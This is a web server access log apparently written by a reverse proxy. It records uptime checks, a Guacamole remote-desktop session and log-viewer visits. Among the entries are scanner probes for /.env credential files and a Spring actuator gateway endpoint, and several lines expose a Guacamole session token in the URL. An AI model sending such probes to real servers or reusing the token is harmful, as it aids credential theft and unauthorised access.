167.71.120.76 - - [20/Dec/2023:20:11:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2770 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:20:12:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2771 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:20:12:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2772 "www@docker" "http://172.20.0.9:80" 0ms
143.110.222.166 - - [20/Dec/2023:20:13:14 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 2773 "web-to-websecure@internal" "-" 0ms
207.115.69.2 - - [20/Dec/2023:20:13:17 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 2774 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [20/Dec/2023:20:13:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2775 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [20/Dec/2023:20:13:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2776 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:20:14:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2777 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:20:14:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2778 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:20:15:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2779 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:20:15:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2780 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:20:16:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2781 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [20/Dec/2023:20:16:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2782 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:20:17:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2783 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:20:17:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2784 "www@docker" "http://172.20.0.9:80" 0ms
167.94.146.55 - - [20/Dec/2023:20:17:44 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 2785 "-" "-" 0ms
167.94.146.55 - - [20/Dec/2023:20:17:47 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 2786 "-" "-" 0ms
159.203.109.206 - - [20/Dec/2023:20:18:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2787 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:20:18:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2788 "www@docker" "http://172.20.0.9:80" 0ms
83.97.73.87 - - [20/Dec/2023:20:18:44 +0000] "GET /actuator/gateway/routes HTTP/1.1" 301 17 "-" "-" 2789 "web-to-websecure@internal" "-" 0ms
83.97.73.87 - - [20/Dec/2023:20:18:46 +0000] "GET /actuator/gateway/routes HTTP/1.1" 404 19 "-" "-" 2790 "-" "-" 0ms
159.203.109.206 - - [20/Dec/2023:20:19:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2791 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:20:19:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2792 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:20:20:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2793 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:20:20:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2794 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:20:21:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2795 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [20/Dec/2023:20:21:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2796 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:20:22:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2797 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:20:22:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2798 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:20:23:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2799 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [20/Dec/2023:20:23:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2800 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:20:24:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2801 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:20:24:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2802 "www@docker" "http://172.20.0.9:80" 0ms
69.164.217.74 - - [20/Dec/2023:20:25:17 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 2803 "-" "-" 0ms
159.203.109.206 - - [20/Dec/2023:20:25:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2804 "www@docker" "http://172.20.0.9:80" 0ms
205.210.31.85 - - [20/Dec/2023:20:25:22 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 2805 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [20/Dec/2023:20:25:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2806 "www@docker" "http://172.20.0.9:80" 0ms
172.104.11.46 - - [20/Dec/2023:20:25:39 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 2807 "-" "-" 0ms
159.203.109.206 - - [20/Dec/2023:20:26:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2808 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:20:26:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2809 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:20:27:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2810 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:20:27:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2811 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:20:28:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2812 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:20:28:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2813 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:20:29:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2814 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [20/Dec/2023:20:29:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2815 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:20:30:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2816 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:20:30:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2817 "www@docker" "http://172.20.0.9:80" 1ms
129.55.200.20 - - [20/Dec/2023:20:31:05 +0000] "GET /guacamole/images/settings/touchscreen.svg HTTP/2.0" 200 5318 "-" "-" 2819 "guacamole@docker" "http://172.20.0.11:8080" 13ms
129.55.200.20 - - [20/Dec/2023:20:31:05 +0000] "GET /guacamole/images/settings/touchpad.svg HTTP/2.0" 200 7643 "-" "-" 2820 "guacamole@docker" "http://172.20.0.11:8080" 13ms
129.55.200.20 - - [20/Dec/2023:20:31:05 +0000] "GET /guacamole/images/settings/tablet-keys.svg HTTP/2.0" 200 5525 "-" "-" 2821 "guacamole@docker" "http://172.20.0.11:8080" 14ms
129.55.200.20 - - [20/Dec/2023:20:31:05 +0000] "POST /guacamole/api/tokens HTTP/2.0" 200 171 "-" "-" 2818 "guacamole@docker" "http://172.20.0.11:8080" 29ms
129.55.200.20 - - [20/Dec/2023:20:31:05 +0000] "GET /guacamole/images/warning.svg HTTP/2.0" 200 1925 "-" "-" 2823 "guacamole@docker" "http://172.20.0.11:8080" 7ms
129.55.200.20 - - [20/Dec/2023:20:31:05 +0000] "GET /guacamole/images/action-icons/guac-back.svg HTTP/2.0" 200 258 "-" "-" 2824 "guacamole@docker" "http://172.20.0.11:8080" 7ms
129.55.200.20 - - [20/Dec/2023:20:31:05 +0000] "GET /guacamole/images/drive.svg HTTP/2.0" 200 994 "-" "-" 2825 "guacamole@docker" "http://172.20.0.11:8080" 7ms
129.55.200.20 - - [20/Dec/2023:20:31:05 +0000] "GET /guacamole/images/user-icons/guac-user-white.svg HTTP/2.0" 200 635 "-" "-" 2826 "guacamole@docker" "http://172.20.0.11:8080" 2ms
129.55.200.20 - - [20/Dec/2023:20:31:05 +0000] "GET /guacamole/images/share-white.svg HTTP/2.0" 200 1088 "-" "-" 2827 "guacamole@docker" "http://172.20.0.11:8080" 2ms
129.55.200.20 - - [20/Dec/2023:20:31:05 +0000] "GET /guacamole/images/arrows/right.svg HTTP/2.0" 200 317 "-" "-" 2828 "guacamole@docker" "http://172.20.0.11:8080" 2ms
129.55.200.20 - - [20/Dec/2023:20:31:05 +0000] "GET /guacamole/app/element/templates/blank.html HTTP/2.0" 200 173 "-" "-" 2829 "guacamole@docker" "http://172.20.0.11:8080" 2ms
129.55.200.20 - - [20/Dec/2023:20:31:05 +0000] "GET /guacamole/api/session/data/mysql/connections/9 HTTP/2.0" 200 300 "-" "-" 2822 "guacamole@docker" "http://172.20.0.11:8080" 127ms
129.55.200.20 - - [20/Dec/2023:20:31:05 +0000] "GET /guacamole/api/session/tunnels/d00af67a-2b95-3e3f-9056-f51704babe54/protocol HTTP/2.0" 200 5172 "-" "-" 2831 "guacamole@docker" "http://172.20.0.11:8080" 195ms
129.55.200.20 - - [20/Dec/2023:20:31:05 +0000] "GET /guacamole/api/session/tunnels/d00af67a-2b95-3e3f-9056-f51704babe54/activeConnection/connection/sharingProfiles HTTP/2.0" 200 2 "-" "-" 2832 "guacamole@docker" "http://172.20.0.11:8080" 402ms
159.203.109.206 - - [20/Dec/2023:20:31:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2833 "www@docker" "http://172.20.0.9:80" 0ms
129.55.200.20 - - [20/Dec/2023:20:31:25 +0000] "POST /guacamole/api/tokens HTTP/2.0" 200 171 "-" "-" 2834 "guacamole@docker" "http://172.20.0.11:8080" 17ms
129.55.200.20 - - [20/Dec/2023:20:31:05 +0000] "GET /guacamole/websocket-tunnel?token=8CDF2B3CC686CD23159B62F41FC9E71C895B6B69056DC0684CC0EB6BF6ACFA34&GUAC_DATA_SOURCE=mysql&GUAC_ID=9&GUAC_TYPE=c&GUAC_WIDTH=1963&GUAC_HEIGHT=1690&GUAC_DPI=120&GUAC_TIMEZONE=America%2FNew_York&GUAC_AUDIO=audio%2FL8&GUAC_AUDIO=audio%2FL16&GUAC_IMAGE=image%2Fjpeg&GUAC_IMAGE=image%2Fpng&GUAC_IMAGE=image%2Fwebp HTTP/1.1" 0 0 "-" "-" 2830 "guacamole@docker" "http://172.20.0.11:8080" 19806ms
129.55.200.20 - - [20/Dec/2023:20:31:25 +0000] "GET /guacamole/images/action-icons/guac-home.svg HTTP/2.0" 200 505 "-" "-" 2835 "guacamole@docker" "http://172.20.0.11:8080" 5ms
129.55.200.20 - - [20/Dec/2023:20:31:25 +0000] "GET /guacamole/images/action-icons/guac-logout.svg HTTP/2.0" 200 1464 "-" "-" 2837 "guacamole@docker" "http://172.20.0.11:8080" 5ms
129.55.200.20 - - [20/Dec/2023:20:31:25 +0000] "GET /guacamole/images/circle-arrows.svg HTTP/2.0" 200 1408 "-" "-" 2836 "guacamole@docker" "http://172.20.0.11:8080" 6ms
129.55.200.20 - - [20/Dec/2023:20:31:27 +0000] "GET /guacamole/api/session/tunnels/28302f1c-0392-3720-b364-33c90e5dec31/protocol HTTP/2.0" 200 5172 "-" "-" 2839 "guacamole@docker" "http://172.20.0.11:8080" 46ms
129.55.200.20 - - [20/Dec/2023:20:31:27 +0000] "GET /guacamole/api/session/tunnels/28302f1c-0392-3720-b364-33c90e5dec31/activeConnection/connection/sharingProfiles HTTP/2.0" 200 2 "-" "-" 2840 "guacamole@docker" "http://172.20.0.11:8080" 307ms
167.71.120.76 - - [20/Dec/2023:20:31:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2841 "www@docker" "http://172.20.0.9:80" 0ms
129.55.200.20 - - [20/Dec/2023:20:32:06 +0000] "GET /logs/ HTTP/2.0" 304 0 "-" "-" 2842 "logpager@docker" "http://172.20.0.3:80" 1ms
129.55.200.20 - - [20/Dec/2023:20:32:06 +0000] "GET /logs/styles.css?version=16 HTTP/2.0" 304 0 "-" "-" 2843 "logpager@docker" "http://172.20.0.3:80" 1ms
129.55.200.20 - - [20/Dec/2023:20:32:06 +0000] "GET /logs/logtail.php?page=0 HTTP/2.0" 200 2973 "-" "-" 2844 "logpager@docker" "http://172.20.0.3:80" 4ms
129.55.200.20 - - [20/Dec/2023:20:32:13 +0000] "GET /logs/logtail.php?page=1 HTTP/2.0" 200 2290 "-" "-" 2845 "logpager@docker" "http://172.20.0.3:80" 7ms
159.203.109.206 - - [20/Dec/2023:20:32:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2846 "www@docker" "http://172.20.0.9:80" 0ms
129.55.200.20 - - [20/Dec/2023:20:32:29 +0000] "GET /logs/logtail.php?page=2 HTTP/2.0" 200 1938 "-" "-" 2847 "logpager@docker" "http://172.20.0.3:80" 11ms
129.55.200.20 - - [20/Dec/2023:20:32:31 +0000] "GET /logs/logtail.php?page=3 HTTP/2.0" 200 1979 "-" "-" 2848 "logpager@docker" "http://172.20.0.3:80" 20ms
167.71.120.76 - - [20/Dec/2023:20:32:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2849 "www@docker" "http://172.20.0.9:80" 1ms
129.55.200.20 - - [20/Dec/2023:20:32:33 +0000] "GET /logs/logtail.php?page=4 HTTP/2.0" 200 1942 "-" "-" 2850 "logpager@docker" "http://172.20.0.3:80" 22ms
129.55.200.20 - - [20/Dec/2023:20:32:34 +0000] "GET /logs/logtail.php?page=5 HTTP/2.0" 200 1983 "-" "-" 2851 "logpager@docker" "http://172.20.0.3:80" 28ms
129.55.200.20 - - [20/Dec/2023:20:32:35 +0000] "GET /logs/logtail.php?page=6 HTTP/2.0" 200 1944 "-" "-" 2852 "logpager@docker" "http://172.20.0.3:80" 27ms
129.55.200.20 - - [20/Dec/2023:20:32:35 +0000] "GET /logs/logtail.php?page=7 HTTP/2.0" 200 1945 "-" "-" 2853 "logpager@docker" "http://172.20.0.3:80" 45ms
129.55.200.20 - - [20/Dec/2023:20:32:36 +0000] "GET /logs/logtail.php?page=8 HTTP/2.0" 200 1944 "-" "-" 2854 "logpager@docker" "http://172.20.0.3:80" 39ms
159.203.109.206 - - [20/Dec/2023:20:33:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2855 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:20:33:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2856 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:20:34:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2857 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [20/Dec/2023:20:34:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2858 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:20:35:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2859 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:20:35:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2860 "www@docker" "http://172.20.0.9:80" 0ms
137.184.85.24 - - [20/Dec/2023:20:36:03 +0000] "GET /aaa9 HTTP/1.1" 404 19 "-" "-" 2861 "-" "-" 0ms
137.184.85.24 - - [20/Dec/2023:20:36:05 +0000] "GET /aab8 HTTP/1.1" 404 19 "-" "-" 2862 "-" "-" 0ms
137.184.85.24 - - [20/Dec/2023:20:36:06 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 2863 "-" "-" 0ms
159.203.109.206 - - [20/Dec/2023:20:36:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2864 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:20:36:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2865 "www@docker" "http://172.20.0.9:80" 1ms
129.55.200.20 - - [20/Dec/2023:20:36:53 +0000] "GET /logs/ HTTP/2.0" 304 0 "-" "-" 2866 "logpager@docker" "http://172.20.0.3:80" 1ms
129.55.200.20 - - [20/Dec/2023:20:36:53 +0000] "GET /logs/logtail.php?page=0 HTTP/2.0" 200 2041 "-" "-" 2867 "logpager@docker" "http://172.20.0.3:80" 4ms
159.203.109.206 - - [20/Dec/2023:20:37:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2868 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:20:37:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2869 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:20:38:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2870 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [20/Dec/2023:20:38:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2871 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:20:39:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2872 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:20:39:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2873 "www@docker" "http://172.20.0.9:80" 0ms
95.214.235.169 - - [20/Dec/2023:20:40:00 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 2874 "web-to-websecure@internal" "-" 0ms
95.214.235.169 - - [20/Dec/2023:20:40:01 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 2875 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [20/Dec/2023:20:40:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2876 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:20:40:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2877 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:20:41:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2878 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:20:41:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2879 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:20:42:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2880 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [20/Dec/2023:20:42:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2881 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:20:43:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2882 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:20:43:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2883 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:20:44:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2884 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:20:44:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2885 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:20:45:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2886 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:20:45:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2887 "www@docker" "http://172.20.0.9:80" 1ms
129.55.200.20 - - [20/Dec/2023:20:46:17 +0000] "GET /logs/ HTTP/2.0" 304 0 "-" "-" 2888 "logpager@docker" "http://172.20.0.3:80" 1ms
129.55.200.20 - - [20/Dec/2023:20:46:17 +0000] "GET /logs/logtail.php?page=0 HTTP/2.0" 200 1949 "-" "-" 2889 "logpager@docker" "http://172.20.0.3:80" 3ms
159.203.109.206 - - [20/Dec/2023:20:46:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2890 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [20/Dec/2023:20:46:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2891 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:20:47:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2892 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:20:47:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2893 "www@docker" "http://172.20.0.9:80" 0ms
95.214.235.169 - - [20/Dec/2023:20:47:34 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 2894 "web-to-websecure@internal" "-" 0ms
95.214.235.169 - - [20/Dec/2023:20:47:35 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 2895 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [20/Dec/2023:20:48:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2896 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:20:48:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2897 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:20:49:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2898 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:20:49:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2899 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:20:50:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2900 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [20/Dec/2023:20:50:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2901 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:20:51:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2902 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:20:51:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2903 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:20:52:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2904 "www@docker" "http://172.20.0.9:80" 0ms
198.74.56.46 - - [20/Dec/2023:20:52:21 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 2905 "-" "-" 0ms
167.71.120.76 - - [20/Dec/2023:20:52:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2906 "www@docker" "http://172.20.0.9:80" 0ms
45.79.128.205 - - [20/Dec/2023:20:52:35 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 2907 "-" "-" 0ms
159.203.109.206 - - [20/Dec/2023:20:53:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2908 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:20:53:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2909 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:20:54:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2910 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:20:54:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2911 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:20:55:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2912 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:20:55:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2913 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:20:56:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2914 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:20:56:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2915 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:20:57:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2916 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:20:57:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2917 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:20:58:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2918 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [20/Dec/2023:20:58:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2919 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:20:59:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2920 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:20:59:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2921 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:21:00:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2922 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [20/Dec/2023:21:00:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2923 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:21:01:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2924 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:21:01:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2925 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:21:02:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2926 "www@docker" "http://172.20.0.9:80" 1ms
129.55.200.20 - - [20/Dec/2023:20:31:27 +0000] "GET /guacamole/websocket-tunnel?token=8CDF2B3CC686CD23159B62F41FC9E71C895B6B69056DC0684CC0EB6BF6ACFA34&GUAC_DATA_SOURCE=mysql&GUAC_ID=9&GUAC_TYPE=c&GUAC_WIDTH=1963&GUAC_HEIGHT=1690&GUAC_DPI=120&GUAC_TIMEZONE=America%2FNew_York&GUAC_AUDIO=audio%2FL8&GUAC_AUDIO=audio%2FL16&GUAC_IMAGE=image%2Fjpeg&GUAC_IMAGE=image%2Fpng&GUAC_IMAGE=image%2Fwebp HTTP/1.1" 0 0 "-" "-" 2838 "guacamole@docker" "http://172.20.0.11:8080" 1863362ms
129.55.200.20 - - [20/Dec/2023:21:02:32 +0000] "GET /logs/ HTTP/2.0" 304 0 "-" "-" 2927 "logpager@docker" "http://172.20.0.3:80" 1ms
129.55.200.20 - - [20/Dec/2023:21:02:32 +0000] "GET /logs/logtail.php?page=0 HTTP/2.0" 200 2327 "-" "-" 2928 "logpager@docker" "http://172.20.0.3:80" 5ms
167.71.120.76 - - [20/Dec/2023:21:02:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2929 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:21:03:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2930 "www@docker" "http://172.20.0.9:80" 1ms
129.55.200.20 - - [20/Dec/2023:21:03:22 +0000] "GET /logs/logtail.php?page=1 HTTP/2.0" 200 1940 "-" "-" 2931 "logpager@docker" "http://172.20.0.3:80" 6ms
129.55.200.20 - - [20/Dec/2023:21:03:23 +0000] "GET /logs/logtail.php?page=0 HTTP/2.0" 200 2373 "-" "-" 2932 "logpager@docker" "http://172.20.0.3:80" 4ms
167.71.120.76 - - [20/Dec/2023:21:03:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2933 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:21:04:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2934 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [20/Dec/2023:21:04:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2935 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:21:05:18 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2936 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:21:05:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2937 "www@docker" "http://172.20.0.9:80" 1ms
